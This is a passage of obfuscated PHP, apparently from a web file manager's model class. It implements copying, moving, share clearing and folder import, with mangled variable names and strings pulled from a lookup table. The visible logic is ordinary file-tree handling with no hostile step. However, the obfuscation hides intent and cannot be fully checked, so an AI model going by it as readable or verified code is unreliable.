$this->_copyCreate($Ñ†É˜•¢, $ÖòÉë„š, $‚Ñö‚ÉÅ, $ßä¤ùÑ); } else { $¾£ˆª« = $this->_childrenList($Ñ†É˜•¢); foreach ($¾£ˆª« as $Ş„Íßüø) { $this->_copy($Ş„Íßüø[$ĞÇÄĞ·[402]], $¥›Å«Ä•, $ª‘¥åˆ„, $ßä¤ùÑ, !1); } } } else { if ($ª‘¥åˆ„ == REPEAT_RENAME || $ª‘¥åˆ„ == REPEAT_RENAME_FOLDER) { $‚Ñö‚ÉÅ = $this->fileNameAutoCache($ÖòÉë„š, $‚Ñö‚ÉÅ, $ª‘¥åˆ„, $Æãû¤Æ); $óÕÁŠ® = $this->_copyCreate($Ñ†É˜•¢, $ÖòÉë„š, $‚Ñö‚ÉÅ, $ßä¤ùÑ); } else { if ($ª‘¥åˆ„ == REPEAT_REPLACE) { $ªÊ¨Ÿ½ = $this->sourceInfoCache($¥›Å«Ä•); $‚¿”­”³ = $this->fileHistory($ªÊ¨Ÿ½, $–¢„ Ì[$ĞÇÄĞ·[468]], $–¢„ Ì[$ĞÇÄĞ·[76]]); if ($‚¿”­”³) { $ßä¤ùÑ[$ĞÇÄĞ·[566]][] = $–¢„ Ì[$ĞÇÄĞ·[468]]; } } else { if ($ª‘¥åˆ„ == REPEAT_SKIP) { } } } Hook::trigger($ĞÇÄĞ·[571], array($ĞÇÄĞ·[572], $–¢„ Ì, 0)); } return $óÕÁŠ®; } private function _copyCreate($šñÅ´Ó, $µ•Õ·Æ , $ŞÇà¦ƒ¸, &$ÖéØò Á) { $—úÁ²óš =& $_SERVER[Ì¥ŞÒ°£]; $á˜Ô¾¶ = $this->sourceInfoCache($šñÅ´Ó); $“ªœûÛ¶ = $this->sourceInfoCache($µ•Õ·Æ ); $õÃº¾úè = $this->_makeItemData($á˜Ô¾¶, $“ªœûÛ¶, $ŞÇà¦ƒ¸); Hook::trigger($—úÁ²óš[573], $õÃº¾úè); Hook::trigger($—úÁ²óš[574], array($—úÁ²óš[575], $õÃº¾úè, 0)); $¾ä¢°Ä¬ = $this->add($õÃº¾úè); $¦Ëš…¾£ = array($—úÁ²óš[402] => $¾ä¢°Ä¬, $—úÁ²óš[32] => $ŞÇà¦ƒ¸); $this->_copyApplyMeta($¦Ëš…¾£, $ÖéØò Á); if ($á˜Ô¾¶[$—úÁ²óš[410]] != $—úÁ²óš[88]) { $ÖéØò Á[$—úÁ²óš[566]][] = $á˜Ô¾¶[$—úÁ²óš[468]]; return $¾ä¢°Ä¬; } $Ã¥¨§Ê¼ = array(); $»·‰ş™ø = array(); $this->_childrenListAll($šñÅ´Ó, $Ã¥¨§Ê¼); $ÅŠİ­‘ô = count($Ã¥¨§Ê¼); if ($ÅŠİ­‘ô == 0) { return $¾ä¢°Ä¬; } $Ã’ê¨°Ñ = $this->sourceInfo($¾ä¢°Ä¬); foreach ($Ã¥¨§Ê¼ as $ĞõóÖšğ) { $Ïú×ÅÀ® = $this->_makeItemData($ĞõóÖšğ, $Ã’ê¨°Ñ, $ĞõóÖšğ[$—úÁ²óš[32]]); $Ïú×ÅÀ®[$—úÁ²óš[521]] = $ĞõóÖšğ[$—úÁ²óš[521]]; $»·‰ş™ø[] = $Ïú×ÅÀ®; } $this->chunkEventSet($—úÁ²óš[576], array($—úÁ²óš[577], $õÃº¾úè, $ÅŠİ­‘ô)); $this->addAll($»·‰ş™ø, array(), !1); $‹‡ŠÑÍü = $this->where(array($—úÁ²óš[432] => $¾ä¢°Ä¬))->select(); $¡úêÓÇ = $this->_childrenMakeRelation($Ã¥¨§Ê¼, $‹‡ŠÑÍü); $¡úêÓÇ[$šñÅ´Ó] = $¾ä¢°Ä¬; $Ğ‰ùúÁí = array(); $–Ò‰ÒØ® = array(); foreach ($‹‡ŠÑÍü as $ĞõóÖšğ) { $ıò¯Ò›¯ = $ĞõóÖšğ[$—úÁ²óš[402]]; $àˆÛºåĞ = $this->_childrenMatch($¡úêÓÇ, $ĞõóÖšğ, $Ã’ê¨°Ñ); $Ğ‰ùúÁí[] = array($—úÁ²óš[402], $ıò¯Ò›¯, $—úÁ²óš[432], $àˆÛºåĞ[$—úÁ²óš[432]]); $–Ò‰ÒØ®[] = array($—úÁ²óš[402], $ıò¯Ò›¯, $—úÁ²óš[521], $àˆÛºåĞ[$—úÁ²óš[521]]); $this->_copyApplyMeta($ĞõóÖšğ, $ÖéØò Á); if ($ĞõóÖšğ[$—úÁ²óš[410]] != $—úÁ²óš[88]) { $ÖéØò Á[$—úÁ²óš[566]][] = $ĞõóÖšğ[$—úÁ²óš[468]]; } } $this->chunkEventSet($—úÁ²óš[578], array($—úÁ²óš[579], $õÃº¾úè, $ÅŠİ­‘ô)); $this->saveAll($Ğ‰ùúÁí); $this->chunkEventSet($—úÁ²óš[580], array($—úÁ²óš[581], $õÃº¾úè, $ÅŠİ­‘ô)); $this->saveAll($–Ò‰ÒØ®); return $¾ä¢°Ä¬; } private function _childrenMakeRelation($êÆÚåõ, $¯‡¬³¦¬) { $µÑõÙ¤Ö =& $_SERVER[Ì¥ŞÒ°£]; $Ó¼Ãƒ¼Ê = array(); $„”¤Â” = array(); foreach ($êÆÚåõ as $ãÖÄğ¾Š) { $¢ò¾°û» = $ãÖÄğ¾Š[$µÑõÙ¤Ö[32]] . $µÑõÙ¤Ö[8] . $ãÖÄğ¾Š[$µÑõÙ¤Ö[521]]; $Ó¼Ãƒ¼Ê[$¢ò¾°û»] = $ãÖÄğ¾Š[$µÑõÙ¤Ö[402]]; } foreach ($¯‡¬³¦¬ as $ãÖÄğ¾Š) { $¢ò¾°û» = $ãÖÄğ¾Š[$µÑõÙ¤Ö[32]] . $µÑõÙ¤Ö[8] . $ãÖÄğ¾Š[$µÑõÙ¤Ö[521]]; $™îôã¶ğ = $Ó¼Ãƒ¼Ê[$¢ò¾°û»]; $„”¤Â”[$™îôã¶ğ] = $ãÖÄğ¾Š[$µÑõÙ¤Ö[402]]; } return $„”¤Â”; } private function _childrenMatch($¢ìø÷Ì, $‰ğÖâ, $™Îû§±) { $«’“½ç¹ =& $_SERVER[Ì¥ŞÒ°£]; $Ô•Ê¸¾‰ = $™Îû§±[$«’“½ç¹[521]]; $ããÖËõÆ = $this->parentLevelArray($‰ğÖâ[$«’“½ç¹[521]]); foreach ($ããÖËõÆ as $ä°ÍÛÕÌ) { if (isset($¢ìø÷Ì[$ä°ÍÛÕÌ])) { $Ô•Ê¸¾‰ .= $¢ìø÷Ì[$ä°ÍÛÕÌ] . $«’“½ç¹[582]; } } $Ô•Ê¸¾‰ = rtrim($Ô•Ê¸¾‰, $«’“½ç¹[50]) . $«’“½ç¹[50]; $ÊØÓŒ» = $this->parentLevelArray($Ô•Ê¸¾‰); $İß×ˆ’Æ = $ÊØÓŒ»[count($ÊØÓŒ») - 1]; return array($«’“½ç¹[432] => $İß×ˆ’Æ, $«’“½ç¹[521] => $Ô•Ê¸¾‰); } private function _makeItemData($Ü™­ëó², $óÖ…•¨§, $Ÿ¾şšĞ¬) { $ãªÄğŠ¤ =& $_SERVER[Ì¥ŞÒ°£]; $÷ª–çü± = array($ãªÄğŠ¤[583] => $Ü™­ëó²[$ãªÄğŠ¤[410]], $ãªÄğŠ¤[420] => $Ÿ¾şšĞ¬, $ãªÄğŠ¤[584] => $Ü™­ëó²[$ãªÄğŠ¤[412]] ? $Ü™­ëó²[$ãªÄğŠ¤[412]] : $ãªÄğŠ¤[12], $ãªÄğŠ¤[469] => $Ü™­ëó²[$ãªÄğŠ¤[468]] ? $Ü™­ëó²[$ãªÄğŠ¤[468]] : 0, $ãªÄğŠ¤[585] => $Ü™­ëó²[$ãªÄğŠ¤[76]] ? $Ü™­ëó²[$ãªÄğŠ¤[76]] : 0, $ãªÄğŠ¤[586] => intval($óÖ…•¨§[$ãªÄğŠ¤[411]]), $ãªÄğŠ¤[587] => intval($óÖ…•¨§[$ãªÄğŠ¤[505]]), $ãªÄğŠ¤[588] => intval(USER_ID), $ãªÄğŠ¤[589] => intval(USER_ID), $ãªÄğŠ¤[401] => intval($óÖ…•¨§[$ãªÄğŠ¤[402]]), $ãªÄğŠ¤[590] => $óÖ…•¨§[$ãªÄğŠ¤[521]] . $óÖ…•¨§[$ãªÄğŠ¤[402]] . $ãªÄğŠ¤[50], $ãªÄğŠ¤[424] => $Ü™­ëó²[$ãªÄğŠ¤[85]] ? $Ü™­ëó²[$ãªÄğŠ¤[85]] : time(), $ãªÄğŠ¤[430] => 0, $ãªÄğŠ¤[591] => $ãªÄğŠ¤[12]); return $÷ª–çü±; } private function _copyApplyMeta($¸ñÚ½¦, &$á·¿ŞÎã) { $ë¡˜ÀŠœ =& $_SERVER[Ì¥ŞÒ°£]; $¥ïª÷Â¯ = $¸ñÚ½¦[$ë¡˜ÀŠœ[402]]; $ç¡…óçá = $¸ñÚ½¦[$ë¡˜ÀŠœ[32]]; if (!isset($¸ñÚ½¦[$ë¡˜ÀŠœ[592]]) || !$¸ñÚ½¦[$ë¡˜ÀŠœ[592]] || $¸ñÚ½¦[$ë¡˜ÀŠœ[592]] == $ë¡˜ÀŠœ[197]) { $á·¿ŞÎã[$ë¡˜ÀŠœ[568]][] = array($ë¡˜ÀŠœ[402], $¥ïª÷Â¯, $ë¡˜ÀŠœ[592], short_id($¥ïª÷Â¯)); } if (Input::check($ç¡…óçá, $ë¡˜ÀŠœ[593])) { $á·¿ŞÎã[$ë¡˜ÀŠœ[567]][] = array($ë¡˜ÀŠœ[402] => $¥ïª÷Â¯, $ë¡˜ÀŠœ[94] => $ë¡˜ÀŠœ[465], $ë¡˜ÀŠœ[374] => str_replace($ë¡˜ÀŠœ[53], $ë¡˜ÀŠœ[12], Pinyin::get($ç¡…óçá))); $á·¿ŞÎã[$ë¡˜ÀŠœ[567]][] = array($ë¡˜ÀŠœ[402] => $¥ïª÷Â¯, $ë¡˜ÀŠœ[94] => $ë¡˜ÀŠœ[464], $ë¡˜ÀŠœ[374] => Pinyin::get($ç¡…óçá, $ë¡˜ÀŠœ[594])); } $á·¿ŞÎã[$ë¡˜ÀŠœ[567]][] = array($ë¡˜ÀŠœ[402] => $¥ïª÷Â¯, $ë¡˜ÀŠœ[94] => $ë¡˜ÀŠœ[444], $ë¡˜ÀŠœ[374] => KodSort::makeStr($ç¡…óçá)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($€„›¥İÌ) { $»¾„à×Ÿ =& $_SERVER[Ì¥ŞÒ°£]; $‡ïëÛ× = $this->sourceInfo($€„›¥İÌ); $Ü‚ºñ‘ = $»¾„à×Ÿ[595]; $¬ùÍ¤ñº = array($»¾„à×Ÿ[521] => array($»¾„à×Ÿ[550], $‡ïëÛ×[$»¾„à×Ÿ[521]] . $€„›¥İÌ . $»¾„à×Ÿ[551]), $»¾„à×Ÿ[431] => $this->targetIsDelete); $şŒ¥¶† = $this->field($Ü‚ºñ‘)->where($¬ùÍ¤ñº)->select(); if (!$şŒ¥¶†) { return; } $şŒ¥¶† = array_to_keyvalue($şŒ¥¶†, $»¾„à×Ÿ[402]); foreach ($şŒ¥¶† as $Ö±†é†) { $‘ìéÉ£½ = $Ö±†é†[$»¾„à×Ÿ[432]]; $€„›¥İÌ = $Ö±†é†[$»¾„à×Ÿ[402]]; if (!isset($this->_childrenListCache[$€„›¥İÌ]) && $Ö±†é†[$»¾„à×Ÿ[410]] == $»¾„à×Ÿ[88]) { $this->_childrenListCache[$€„›¥İÌ] = array(); } if (!isset($this->_childrenListCache[$‘ìéÉ£½])) { $this->_childrenListCache[$‘ìéÉ£½] = array(); } $this->_childrenListCache[$‘ìéÉ£½][$€„›¥İÌ] = $Ö±†é†; $this->_childrenItemCache[$€„›¥İÌ] = $Ö±†é†; } } private function _childrenListAll($ıÌªÍ’Ò, &$Â°‹’‘) { $“¹†Á¦ğ =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($this->_childrenListCache[$ıÌªÍ’Ò])) { return; } $Òİï›œ = $this->_childrenListCache[$ıÌªÍ’Ò]; foreach ($Òİï›œ as $§à«Ê«Å => $â®•Ã÷) { $Â°‹’‘[$§à«Ê«Å] = $â®•Ã÷; if ($â®•Ã÷[$“¹†Á¦ğ[410]] == $“¹†Á¦ğ[88]) { $this->_childrenListAll($§à«Ê«Å, $Â°‹’‘); } } } private function sourceInfoCache($»ÖÁ®Ø) { if (isset($this->_childrenItemCache[$»ÖÁ®Ø])) { return $this->_childrenItemCache[$»ÖÁ®Ø]; } return $this->sourceInfo($»ÖÁ®Ø); } private function _childrenList($ß£÷Ï«¨) { if (isset($this->_childrenListCache[$ß£÷Ï«¨])) { return $this->_childrenListCache[$ß£÷Ï«¨]; } return $this->_childrenListSelect($ß£÷Ï«¨); } private function _childrenListSelect($»å¥­Øï) { $ğ¿Î¤¹Š =& $_SERVER[Ì¥ŞÒ°£]; $õ±–³² = array($ğ¿Î¤¹Š[432] => $»å¥­Øï, $ğ¿Î¤¹Š[431] => $this->targetIsDelete); $—ñ¦­´ = $this->where($õ±–³²)->select(); $—ñ¦­´ = $—ñ¦­´ ? $—ñ¦­´ : array(); $ùÕæ†Ğ = array_to_keyvalue($—ñ¦­´, $ğ¿Î¤¹Š[402]); $this->_childrenListCache[$»å¥­Øï] = $ùÕæ†Ğ; foreach ($ùÕæ†Ğ as $»å¥­Øï => $º‹á˜ùÛ) { $this->_childrenItemCache[$»å¥­Øï] = $º‹á˜ùÛ; } return $ùÕæ†Ğ; } private function fileNameExistCache($ƒÏ¤’Ó±, $‚Õ…ÑÈ’) { $ºƒèÜÇğ =& $_SERVER[Ì¥ŞÒ°£]; $‚Õ…ÑÈ’ = strtolower($‚Õ…ÑÈ’); $µÁß»ïœ = $this->_childrenList($ƒÏ¤’Ó±); foreach ($µÁß»ïœ as $ÙıÖŞü) { if ($‚Õ…ÑÈ’ == strtolower($ÙıÖŞü[$ºƒèÜÇğ[32]])) { return $ÙıÖŞü[$ºƒèÜÇğ[402]]; } } return !1; } private function fileNameAutoCache($Î›Êœ¯›, $º›õ’¨¤, $™¾Š•ÖÅ, $·†³†—è) { $«æ›‹Å =& $_SERVER[Ì¥ŞÒ°£]; $×íÙç’å = $this->_childrenList($Î›Êœ¯›); $Œ¥‚¶»ô = array_to_keyvalue($×íÙç’å, $«æ›‹Å[12], $«æ›‹Å[32]); return $this->fileNameAutoGet($Œ¥‚¶»ô, $º›õ’¨¤, $™¾Š•ÖÅ, $·†³†—è); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($š†ÑÄú¹, $†æóŒÕ‡, $é˜‹˜à¼ = REPEAT_REPLACE, $¢¾‘²Œß = '') { $ë“³ÚŒ =& $_SERVER[Ì¥ŞÒ°£]; $ÃÎúéºæ = $this->sourceInfo($š†ÑÄú¹); $ÏŞâè‚× = $this->sourceInfo($†æóŒÕ‡); if ($ÃÎúéºæ[$ë“³ÚŒ[432]] == $ÏŞâè‚×[$ë“³ÚŒ[402]]) { if ($ÃÎúéºæ[$ë“³ÚŒ[431]] == $ë“³ÚŒ[88]) { Model($ë“³ÚŒ[429])->restore(array($š†ÑÄú¹)); } if (!$¢¾‘²Œß || $¢¾‘²Œß == $ÃÎúéºæ[$ë“³ÚŒ[32]]) { return $š†ÑÄú¹; } } $ø‰€ıÜ¥ = $this->pathInfoMore($š†ÑÄú¹); if ($this->isParentOf($š†ÑÄú¹, $†æóŒÕ‡)) { return !1; } if (!$ÃÎúéºæ || !$ÏŞâè‚× || $ÏŞâè‚×[$ë“³ÚŒ[410]] != $ë“³ÚŒ[88]) { return !1; } Hook::trigger($ë“³ÚŒ[596], $ø‰€ıÜ¥); $this->targetIsDelete = intval($ÃÎúéºæ[$ë“³ÚŒ[431]]); if ($ÃÎúéºæ[$ë“³ÚŒ[432]] == $†æóŒÕ‡ && $¢¾‘²Œß != $ÃÎúéºæ[$ë“³ÚŒ[32]]) { $³Ïâò›š = $this->fileNameExist($†æóŒÕ‡, $¢¾‘²Œß); if ($³Ïâò›š && $ÃÎúéºæ[$ë“³ÚŒ[410]] == $ë“³ÚŒ[197]) { $¹¦úòË’ = $this->sourceInfo($³Ïâò›š); $¾ÑÌü«× = $this->fileHistory($¹¦úòË’, $ÃÎúéºæ[$ë“³ÚŒ[468]], $ÃÎúéºæ[$ë“³ÚŒ[76]]); if (!$¾ÑÌü«×) { Model($ë“³ÚŒ[471])->remove($ÃÎúéºæ[$ë“³ÚŒ[468]]); } $this->removeNow($š†ÑÄú¹, !1); $this->folderSizeReset($†æóŒÕ‡); Hook::trigger($ë“³ÚŒ[597], $ø‰€ıÜ¥); return $³Ïâò›š; } } $Çõ›ëû“ = $¢¾‘²Œß ? $¢¾‘²Œß : $ÃÎúéºæ[$ë“³ÚŒ[32]]; $this->lockMoveStart($š†ÑÄú¹); $this->lockWriteStart($†æóŒÕ‡, $Çõ›ëû“); $ãå”İÌ = array($ë“³ÚŒ[566] => array(), $ë“³ÚŒ[598] => !1); $this->clearShare($š†ÑÄú¹, $†æóŒÕ‡); $óõ€—šú = $this->fileNameExistCache($†æóŒÕ‡, $ÃÎúéºæ[$ë“³ÚŒ[32]]); $ò†Ê÷Ø… = $this->_move($š†ÑÄú¹, $†æóŒÕ‡, $é˜‹˜à¼, $ãå”İÌ, $¢¾‘²Œß); $this->sourceCacheClear(); if ($ÃÎúéºæ[$ë“³ÚŒ[410]] == $ë“³ÚŒ[88] && $óõ€—šú) { $this->folderSizeResetChildren($ò†Ê÷Ø…); } Model($ë“³ÚŒ[199])->linkAdd($ãå”İÌ[$ë“³ÚŒ[566]]); if ($óõ€—šú && $ãå”İÌ[$ë“³ÚŒ[598]]) { $this->removeNow($š†ÑÄú¹, !1); } $this->lockMoveEnd($š†ÑÄú¹); $this->lockWriteEnd($†æóŒÕ‡, $Çõ›ëû“); $this->folderSizeReset($ÃÎúéºæ[$ë“³ÚŒ[432]]); $this->folderSizeReset($†æóŒÕ‡); $î£â‡Í™ = array($ÃÎúéºæ[$ë“³ÚŒ[432]], $†æóŒÕ‡); if ($ÃÎúéºæ[$ë“³ÚŒ[410]] == $ë“³ÚŒ[88]) { $î£â‡Í™[] = $š†ÑÄú¹; } $this->updateModifyTime($î£â‡Í™); Model($ë“³ÚŒ[570])->eventMove($š†ÑÄú¹, $ÃÎúéºæ[$ë“³ÚŒ[432]], $†æóŒÕ‡); Hook::trigger($ë“³ÚŒ[597], $ø‰€ıÜ¥); return $ò†Ê÷Ø…; } private function _move($õ³„—¢­, $‡“ì€¤³, $ÔÚ…Ò‡”, &$öÍßÃÆ, $ÔğçÙû = '') { $ô±Ãı‹… =& $_SERVER[Ì¥ŞÒ°£]; $®éÅá„É = $this->sourceInfo($õ³„—¢­); $¦Ú½Ø“ú = $®éÅá„É[$ô±Ãı‹…[410]] == $ô±Ãı‹…[88]; $óÚéÚîİ = $ÔğçÙû ? $ÔğçÙû : $®éÅá„É[$ô±Ãı‹…[32]]; $ôØÇˆóİ = $this->fileNameExistCache($‡“ì€¤³, $óÚéÚîİ); $this->lockMoveStart($õ³„—¢­); $this->lockWriteStart($‡“ì€¤³, $óÚéÚîİ); if (!$ôØÇˆóİ) { return $this->_moveForce($õ³„—¢­, $‡“ì€¤³, $óÚéÚîİ); } $×ò»Õø = $ôØÇˆóİ; $ıÙ¦š´è = !1; if ($¦Ú½Ø“ú) { if ($ÔÚ…Ò‡” == REPEAT_RENAME_FOLDER) { $óÚéÚîİ = $this->fileNameAuto($‡“ì€¤³, $óÚéÚîİ, $ÔÚ…Ò‡”, $¦Ú½Ø“ú); $×ò»Õø = $this->_moveForce($õ³„—¢­, $‡“ì€¤³, $óÚéÚîİ); } else { if ($ÔÚ…Ò‡” == REPEAT_RENAME_FOLDER) { $ÔÚ…Ò‡” = REPEAT_RENAME; } $ï•©Æşİ = $this->_childrenListSelect($õ³„—¢­); foreach ($ï•©Æşİ as $·¢Ş‹ ´) { $this->_move($·¢Ş‹ ´[$ô±Ãı‹…[402]], $ôØÇˆóİ, $ÔÚ…Ò‡”, $öÍßÃÆ); } $ıÙ¦š´è = !0; } } else { if ($ÔÚ…Ò‡” == REPEAT_SKIP) { $ıÙ¦š´è = !0; } else { if ($ÔÚ…Ò‡” == REPEAT_RENAME || $ÔÚ…Ò‡” == REPEAT_RENAME_FOLDER) { $óÚéÚîİ = $this->fileNameAuto($‡“ì€¤³, $óÚéÚîİ, $ÔÚ…Ò‡”, $¦Ú½Ø“ú); $×ò»Õø = $this->_moveForce($õ³„—¢­, $‡“ì€¤³, $óÚéÚîİ); } else { if ($ÔÚ…Ò‡” == REPEAT_REPLACE) { $šˆœº±° = $this->sourceInfoCache($ôØÇˆóİ); $‡šÖ×ü = $this->fileHistory($šˆœº±°, $®éÅá„É[$ô±Ãı‹…[468]], $®éÅá„É[$ô±Ãı‹…[76]]); $ıÙ¦š´è = !0; if ($‡šÖ×ü) { $öÍßÃÆ[$ô±Ãı‹…[566]][] = $®éÅá„É[$ô±Ãı‹…[468]]; } } } } } if ($ıÙ¦š´è && !$öÍßÃÆ[$ô±Ãı‹…[598]]) { $öÍßÃÆ[$ô±Ãı‹…[598]] = !0; } return $×ò»Õø; } private function _moveForce($æ­œÅ€¤, $Š¡”™µ¨, $±Ú‘¸¬) { $Ÿ‡ ûÖ =& $_SERVER[Ì¥ŞÒ°£]; $¹úö«×û = $this->sourceInfo($æ­œÅ€¤); $‹â‹¨ÈŠ = $this->sourceInfo($Š¡”™µ¨); $‰èÕ±À¤ = $¹úö«×û[$Ÿ‡ ûÖ[410]] == $Ÿ‡ ûÖ[88]; $–°Î‹› = array($Ÿ‡ ûÖ[401] => $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[402]], $Ÿ‡ ûÖ[590] => $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[521]] . $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[402]] . $Ÿ‡ ûÖ[50], $Ÿ‡ ûÖ[586] => $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[411]], $Ÿ‡ ûÖ[587] => $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[505]], $Ÿ‡ ûÖ[589] => USER_ID, $Ÿ‡ ûÖ[420] => $±Ú‘¸¬); $ÏıóÜ’… = $¹úö«×û[$Ÿ‡ ûÖ[411]] == SourceModel::TYPE_GROUP && $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[411]] == SourceModel::TYPE_GROUP && $¹úö«×û[$Ÿ‡ ûÖ[505]] == $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[505]]; if (!$ÏıóÜ’… && $this->moveClearAuth) { Model($Ÿ‡ ûÖ[502])->authClear($æ­œÅ€¤); } $­Ã—Í = $¹úö«×û[$Ÿ‡ ûÖ[431]] == $Ÿ‡ ûÖ[88] && $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[431]] != $Ÿ‡ ûÖ[88]; if ($­Ã—Í) { $–°Î‹›[$Ÿ‡ ûÖ[430]] = 0; } if ($‰èÕ±À¤) { $³Œ€Ï–ı = array($Ÿ‡ ûÖ[590] => array($Ÿ‡ ûÖ[550], $¹úö«×û[$Ÿ‡ ûÖ[521]] . $¹úö«×û[$Ÿ‡ ûÖ[402]] . $Ÿ‡ ûÖ[551])); $§¸ï—ø = $¹úö«×û[$Ÿ‡ ûÖ[521]] . $¹úö«×û[$Ÿ‡ ûÖ[402]] . $Ÿ‡ ûÖ[50]; $á¯Åèğ = $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[521]] . $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[402]] . $Ÿ‡ ûÖ[50] . $¹úö«×û[$Ÿ‡ ûÖ[402]] . $Ÿ‡ ûÖ[50]; $‡¸òµ‘è = array($Ÿ‡ ûÖ[590] => array($Ÿ‡ ûÖ[599], "\162\145\160\154\141\143\145\x28\160\x61\162\x65\x6e\164\x4c\145\x76\x65\x6c\x2c\47{$§¸ï—ø}\47\x2c\x27{$á¯Åèğ}\x27\x29"), $Ÿ‡ ûÖ[586] => $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[411]], $Ÿ‡ ûÖ[587] => $‹â‹¨ÈŠ[$Ÿ‡ ûÖ[505]]); if ($­Ã—Í) { $‡¸òµ‘è[$Ÿ‡ ûÖ[430]] = 0; } $this->where($³Œ€Ï–ı)->data($‡¸òµ‘è)->save(); } $this->where(array($Ÿ‡ ûÖ[417] => $æ­œÅ€¤))->data($–°Î‹›)->save(); return $æ­œÅ€¤; } private function clearShare($½”Ûö†, $Ã¤†×¿­) { $Úªšç¦Ñ =& $_SERVER[Ì¥ŞÒ°£]; $İäñŒò = $this->sourceInfo($½”Ûö†); $â¸¡ë¹ = $this->sourceInfo($Ã¤†×¿­); if ($İäñŒò[$Úªšç¦Ñ[505]] == $â¸¡ë¹[$Úªšç¦Ñ[505]] && $İäñŒò[$Úªšç¦Ñ[411]] == $Úªšç¦Ñ[600]) { return; } $¬Áê†– = array($Úªšç¦Ñ[521] => array($Úªšç¦Ñ[550], $İäñŒò[$Úªšç¦Ñ[521]] . $½”Ûö† . $Úªšç¦Ñ[551])); $§¶ŞµÕ = $this->field($Úªšç¦Ñ[417])->where($¬Áê†–)->getField($Úªšç¦Ñ[402], !0); if (!$§¶ŞµÕ) { return; } $¬Áê†– = array($Úªšç¦Ñ[402] => array($Úªšç¦Ñ[7], $§¶ŞµÕ), $Úªšç¦Ñ[496] => 1); $½‚ñá¨¿ = Model($Úªšç¦Ñ[601])->field($Úªšç¦Ñ[489])->where($¬Áê†–)->select(); if (!$½‚ñá¨¿) { return; } $½‚ñá¨¿ = array_to_keyvalue($½‚ñá¨¿, $Úªšç¦Ñ[12], $Úªšç¦Ñ[489]); $¬Áê†– = array($Úªšç¦Ñ[489] => array($Úªšç¦Ñ[7], $½‚ñá¨¿)); Model($Úªšç¦Ñ[601])->where($¬Áê†–)->save(array($Úªšç¦Ñ[496] => 0)); Model($Úªšç¦Ñ[602])->where($¬Áê†–)->delete(); } public function copyFolderFromIO($Ã¡Î–¢², $… Š İæ, $ı¨Çé§, $ÂùÃÁßÖ, $˜å×¾Ô·, $ó„›Î›æ = false) { $º”á£†½ =& $_SERVER[Ì¥ŞÒ°£]; $©ôŠôôå = array($º”á£†½[567] => array(), $º”á£†½[568] => array(), $º”á£†½[566] => array(), $º”á£†½[603] => array()); $¡ËÆîá = $ó„›Î›æ ? $ó„›Î›æ : $Ã¡Î–¢²->pathThis($… Š İæ); $ÉšÏ‘Á = $this->fileNameExist($ı¨Çé§, $¡ËÆîá); $öÅıÍÓ¼ = $this->mkdir($ı¨Çé§, $¡ËÆîá, $ÂùÃÁßÖ); if (!$ÉšÏ‘Á || $ÂùÃÁßÖ == REPEAT_RENAME_FOLDER) { $ÂùÃÁßÖ = !1; } if ($ÉšÏ‘Á) { $this->_childrenAllMake($ÉšÏ‘Á); } Hook::trigger($º”á£†½[604]); $this->_copyChildTo($Ã¡Î–¢², $… Š İæ, $öÅıÍÓ¼, $ÂùÃÁßÖ, $©ôŠôôå, $˜å×¾Ô·); Hook::trigger($º”á£†½[605]); if ($öÅıÍÓ¼) { $this->folderSizeResetChildren($öÅıÍÓ¼); } $this->_childrenListClear(); Model($º”á£†½[569])->addAll($©ôŠôôå[$º”á£†½[567]], array(), !0); Model($º”á£†½[570])->eventCopy($öÅıÍÓ¼); $this->saveAll($©ôŠôôå[$º”á£†½[568]]); Model($º”á£†½[471])->linkAdd($©ôŠôôå[$º”á£†½[566]]); Model($º”á£†½[471])->remove($©ôŠôôå[$º”á£†½[603]]); $this->folderSizeReset($ı¨Çé§); $this->updateModifyTime($ı¨Çé§); return $öÅıÍÓ¼; } private function _copyChildTo($å´Â‹©, $Ğáñ›°³, $›¥—²çÃ, $Ü†´èÀ¿, &$ûÛÎÓ, $Öæ ®Ì) { $¶ö§öÊİ =& $_SERVER[Ì¥ŞÒ°£]; $¡Ùû´ = $this->sourceInfoCache($›¥—²çÃ); $õ“û£ÊÓ = $å´Â‹©->listPath($Ğáñ›°³); $õ“û£ÊÓ = $õ“û£ÊÓ ? $õ“û£ÊÓ : array($¶ö§öÊİ[83] => array(), $¶ö§öÊİ[82] => array()); $õ¢£ÂÓ… = array_merge($õ“û£ÊÓ[$¶ö§öÊİ[83]], $õ“û£ÊÓ[$¶ö§öÊİ[82]]); $ã³³ƒÕ = $this->_addFiles($å´Â‹©, $õ“û£ÊÓ[$¶ö§öÊİ[83]], $Öæ ®Ì); $ì†Â¼›À = array(); foreach ($õ¢£ÂÓ… as &$à»à‹¼) { if (isset($ã³³ƒÕ[$à»à‹¼[$¶ö§öÊİ[32]]])) { $à»à‹¼ = $ã³³ƒÕ[$à»à‹¼[$¶ö§öÊİ[32]]]; } $à»à‹¼[$¶ö§öÊİ[410]] = $à»à‹¼[$¶ö§öÊİ[33]] == $¶ö§öÊİ[75]; $à»à‹¼[$¶ö§öÊİ[412]] = substr(_get($à»à‹¼, $¶ö§öÊİ[174], $¶ö§öÊİ[12]), 0, 10); $à»à‹¼[$¶ö§öÊİ[76]] = _get($à»à‹¼, $¶ö§öÊİ[76], 0); $à»à‹¼[$¶ö§öÊİ[468]] = _get($à»à‹¼, $¶ö§öÊİ[468], 0); if (!isset($à»à‹¼[$¶ö§öÊİ[606]]) && $à»à‹¼[$¶ö§öÊİ[468]]) { $ûÛÎÓ[$¶ö§öÊİ[603]][] = $à»à‹¼[$¶ö§öÊİ[468]]; } if ($Ü†´èÀ¿) { $Ç®¼áş‰ = $this->fileNameExistCache($›¥—²çÃ, $à»à‹¼[$¶ö§öÊİ[32]]); if ($Ç®¼áş‰) { if ($à»à‹¼[$¶ö§öÊİ[410]] || $Ü†´èÀ¿ 